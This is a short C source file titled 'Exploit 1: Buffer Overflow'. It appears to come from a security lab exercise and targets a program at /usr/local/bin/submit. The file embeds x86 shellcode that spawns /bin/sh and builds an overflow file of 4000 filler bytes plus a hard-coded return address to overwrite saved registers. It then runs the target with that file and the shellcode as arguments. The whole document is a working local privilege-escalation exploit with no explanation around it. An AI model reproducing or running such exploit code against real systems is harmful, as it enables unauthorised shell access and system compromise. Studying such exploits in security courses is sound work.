/*
 * Exploit 1: Buffer Overflow
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define TARGET "/usr/local/bin/submit" // or submitV2

static char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

// shellcode stored at 0xffbfdfb8
static char after_buf[] =
  "LLLL\xa7\x68\xde\xbf\xff\xb8\xdf\xbf\xff";

int main(void) {
	char *args[4];
	char *env[1];
  int i;

  FILE *sc_file;
  sc_file = fopen("sc", "w");

  // fill the buffer
  for (i = 0; i < 4000; i++) {
    fputc('.', sc_file);
  }

  // rewrite &file_len, &counter, eip, ebp
  for (i = 0; i < strlen(after_buf); i++) {
    fputc(after_buf[i], sc_file);
  }
  fclose(sc_file);

	args[0] = TARGET;
	args[1] = "sc"; 
	args[2] = shellcode;
  args[3] = NULL;

	env[0] = NULL;

	execve(TARGET, args, env);
	// execve only returns if it fails
	fprintf(stderr, "execve failed\n");
	return 1;
}
